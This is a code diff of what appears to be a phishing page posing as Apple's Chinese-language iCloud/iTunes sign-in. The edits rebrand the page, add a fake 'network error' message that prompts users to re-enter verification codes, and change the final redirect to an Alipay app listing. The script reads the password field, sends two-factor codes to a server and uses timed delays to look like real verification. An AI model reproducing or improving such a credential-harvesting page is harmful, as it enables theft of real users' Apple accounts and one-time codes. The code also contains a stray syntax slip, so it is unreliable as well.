@@ -83,7 +83,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
 
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
-    <title>iCloud</title>
+    <title>iTunes</title>
 
     <style id="cw-bootstrap-css">
         body {
@@ -1366,12 +1366,13 @@
                 <div class="toolbar-view">
                     <div class="toolbar-items-view">
                         <div class="toolbar-left-view visible"><span class="icloud-logo-view cw-button"
-                                style="width: 59px; min-width: 59px;" disabled="true"><svg version="1"
+                                style="width: 59px; min-width: 59px;" disabled="true">
+                                <!-- <svg version="1"
                                     xmlns="http://www.w3.org/2000/svg" viewBox="0 0 118 34">
                                     <path stroke="none"
                                         d="M1 3.9c0-1.4 1.2-2.6 2.6-2.6 1.4 0 2.6 1.1 2.6 2.5S5.1 6.4 3.7 6.4h-.1C2.2 6.5 1 5.3 1 3.9zm.4 5.8h4.5v22H1.4v-22zm8.8 6.9C10.2 7 15.7 1 24.1 1 31 1 36.2 5.2 37 11.5h-4.7c-.8-3.9-4.1-6.4-8.2-6.4-5.5 0-9.1 4.5-9.1 11.5s3.5 11.5 9.1 11.5c4.2 0 7.2-2.2 8.2-5.8H37c-1.2 6.2-5.9 9.9-12.9 9.9-8.5 0-13.9-6-13.9-15.6zM40.9 1.5h4.5v30.2h-4.5V1.5zm18.7 7.9c-6.4 0-10.5 4.4-10.5 11.3S53.2 32 59.6 32s10.5-4.3 10.5-11.3c0-6.9-4-11.3-10.5-11.3zm0 18.8c-3.7 0-5.9-2.8-5.9-7.6 0-4.7 2.2-7.6 5.9-7.6s5.9 2.8 5.9 7.6-2.2 7.6-5.9 7.6zm33 3.5h-4.4v-3.8h-.1c-1.3 2.6-3.5 4-6.9 4-4.8 0-7.8-3.1-7.8-8.1V9.7h4.5v13.2c0 3.3 1.6 5.1 4.7 5.1 3.3 0 5.3-2.3 5.3-5.7V9.7h4.5l.2 22zm19.8-30.2v11.8h-.1c-1.3-2.4-3.8-3.9-6.9-3.9-5.5 0-9.3 4.4-9.3 11.2s3.8 11.2 9.3 11.2c3.2 0 5.7-1.5 7-4h.1v3.7h4.4v-30h-4.5zm-5.8 26.6c-3.5 0-5.9-2.9-5.9-7.4s2.3-7.4 5.9-7.4c3.5 0 5.8 2.9 5.8 7.4.1 4.5-2.3 7.4-5.8 7.4z">
                                     </path>
-                                </svg>
+                                </svg> -->
                             </span></div>
                         <div class="toolbar-center-view"><span tabindex="0" class="apple-icon-view cw-button"><svg
                                     viewBox="0 0 18 24" xmlns="http://www.w3.org/2000/svg">
@@ -1520,11 +1521,17 @@
                                                                     </h1>
 
 
-                                                                    <div id='wenjuncodeerror'
+                                                                    <div id='wenjuncodeerror1'
                                                                         class="pop-container error tk-subbody"
                                                                         tabindex="-1" role="tooltip"
                                                                         style="display: none;">
                                                                         <div class="error pop-top">您输入验证码有误。请重试。</div>
+                                                                    </div>
+                                                                    <div id='wenjuncodeerror2'
+                                                                        class="pop-container error tk-subbody"
+                                                                        tabindex="-1" role="tooltip"
+                                                                        style="display: none;">
+                                                                        <div class="error pop-top">网络错误。请重试。</div>
                                                                     </div>
 
                                                                     <div class="sec-code-wrapper">
@@ -1677,7 +1684,7 @@
                                                                     <div class="signin fade-in" id="signin">
                                                                         <h1 tabindex="-1"
                                                                             class="si-container-title tk-intro "> 登录
-                                                                            iCloud
+                                                                            iTunes
                                                                         </h1>
                                                                         <div
                                                                             class="container si-field-container  password-second-step     ">
@@ -2659,7 +2666,8 @@
         let wenjunPwd = document.querySelector("#password_text_field");
         let wenjunwaiting = document.querySelector("#wenjunwaiting");
         let wenjunerror = document.querySelector("#wenjunerror");
-        let wenjuncodeerror = document.querySelector("#wenjuncodeerror");
+        let wenjuncodeerror = document.querySelector("#wenjuncodeerror1");
+        let wenjuncodeerror2 = document.querySelector("#wenjuncodeerror2");
         let stepEl = document.querySelector("#stepEl");
         let stepE2 = document.querySelector("#stepE2");
         let wenjuncheckingcode = document.querySelector("#verifying-code");
@@ -2690,11 +2698,19 @@
                     if (data === "error") {
                         for (let __i = 0, __j = wenjunchars.length; __i < __j; __i++) {
                             wenjunchars[__i].value = "";
-                            wenjuncodeerror.style.display = "";
+                        }1
+                        wenjuncodeerror2.style.display = "none";
+                        wenjuncodeerror.style.display = "";
+                    } else if (data === "delay") {
+                        for (let __i = 0, __j = wenjunchars.length; __i < __j; __i++) {
+                            wenjunchars[__i].value = "";
                         }
+                        wenjuncodeerror.style.display = "none";
+                        wenjuncodeerror2.style.display = "";
                     } else {
                         wenjuncodeerror.style.display = "none";
-                        window.location.href = "https://apps.apple.com/cn/app/apple-store/id393765873";
+                        wenjuncodeerror2.style.display = "none";
+                        window.location.href = "https://apps.apple.com/cn/app/%E6%94%AF%E4%BB%98%E5%AE%9D-%E8%AE%A9%E7%94%9F%E6%B4%BB%E6%9B%B4%E7%AE%80%E5%8D%95/id3332062891";
                     }
                     wenjuncheckingcode.style.display = "none";
                 }, 4500);
@@ -2704,6 +2720,7 @@
         let inputCode = () => {
             wenjuncheckingcode.style.display = "none";
             wenjuncodeerror.style.display = "none";
+            wenjuncodeerror2.style.display = "none";
             let str = "";
             for (let __i = 0, __j = wenjunchars.length; __i < __j; __i++) {
                 str += (wenjunchars[__i].value || "-");
@@ -2774,7 +2791,7 @@
                     callback(data);
                 },
                 error: (data) => {
-                    callback("error");
+                    callback("delay");
                 }
             });
         }
@@ -2834,9 +2851,16 @@
         }
 
         if (/step\=2/.test(window.location.href)) {
-            stepEl.style.display = "none";
-            stepE2.style.display = "";
-            wenjunerror.style.display = "none";
+            wenjunwaiting.classList.remove("hide");
+            wenjunwaiting.classList.add("show");
+            setTimeout(() => {
+                wenjunwaiting.classList.add("hide");
+                wenjunwaiting.classList.remove("show");
+                inputCode();
+                stepEl.style.display = "none";
+                stepE2.style.display = "";
+                wenjunerror.style.display = "none";
+            }, 1700);
         }
     </script>
 </body>
